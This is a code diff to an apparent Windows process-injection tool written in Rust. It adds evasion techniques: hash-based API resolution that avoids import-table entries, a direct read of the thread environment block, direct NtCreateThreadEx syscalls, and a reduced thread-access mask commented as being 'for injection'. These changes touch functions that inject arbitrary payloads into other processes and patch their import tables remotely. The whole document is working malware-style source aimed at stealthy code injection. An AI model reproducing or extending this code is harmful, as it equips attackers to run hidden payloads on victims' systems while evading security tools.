@@ -2,6 +2,29 @@ use anyhow::{anyhow, Result};
 #[cfg(windows)]
 use winapi::ctypes::c_void;
 
+/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
+#[cfg(windows)]
+unsafe fn get_last_error() -> u32 {
+    use std::sync::OnceLock;
+    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
+    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetLastError\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    if let Some(func) = fn_ptr {
+        func()
+    } else {
+        // Fallback: read TEB directly (x86_64 Windows)
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        std::ptr::read_volatile(teb.add(0x68) as *const u32)
+    }
+}
+
 /// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
 /// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
 #[cfg(any(windows, test))]
@@ -130,7 +153,8 @@ struct IoStatusBlock {
 #[cfg(windows)] const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
 #[cfg(windows)] const NT_SEC_IMAGE: u32 = 0x0100_0000;
 #[cfg(windows)] const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
-#[cfg(windows)] const NT_THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
+/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
+#[cfg(windows)] const NT_THREAD_INJECT_ACCESS: u32 = 0x1A02;
 /// THREAD_CREATE_FLAGS_CREATE_SUSPENDED
 #[cfg(windows)] const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
 /// NtCurrentProcess() pseudo-handle (-1).
@@ -255,7 +279,7 @@ unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *m
     let s = nt_syscall::syscall!(
         "NtCreateThreadEx",
         &mut h_thread as *mut _ as u64,
-        NT_THREAD_ALL_ACCESS as u64,
+        NT_THREAD_INJECT_ACCESS as u64,
         0u64,
         h_process as u64,
         start_addr as u64,
@@ -1638,7 +1662,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             return Err(anyhow!(
                 "OpenProcess(pid={}) failed: {}",
                 pid,
-                winapi::um::errhandlingapi::GetLastError()
+                unsafe { get_last_error() }
             ));
         }
 
@@ -1902,7 +1926,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let mut h_thread: *mut c_void = null_mut();
             let status = nt_create_thread(
                 &mut h_thread,
-                0x1FFFFF,
+                NT_THREAD_INJECT_ACCESS,
                 null_mut(),
                 hprocess,
                 entry,
@@ -1957,7 +1981,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let mut h_sc_thread: *mut c_void = null_mut();
             let sc_status = nt_create_thread(
                 &mut h_sc_thread,
-                0x1FFFFF,
+                NT_THREAD_INJECT_ACCESS,
                 null_mut(),
                 hprocess,
                 remote_mem,
@@ -2132,7 +2156,7 @@ unsafe fn fix_iat_remote(
                                 let status = nt_syscall::syscall!(
                                     "NtCreateThreadEx",
                                     &mut h_thread as *mut _ as u64,
-                                    NT_THREAD_ALL_ACCESS as u64,
+                                    NT_THREAD_INJECT_ACCESS as u64,
                                     0u64,
                                     hprocess as u64,
                                     ldr_addr as u64,
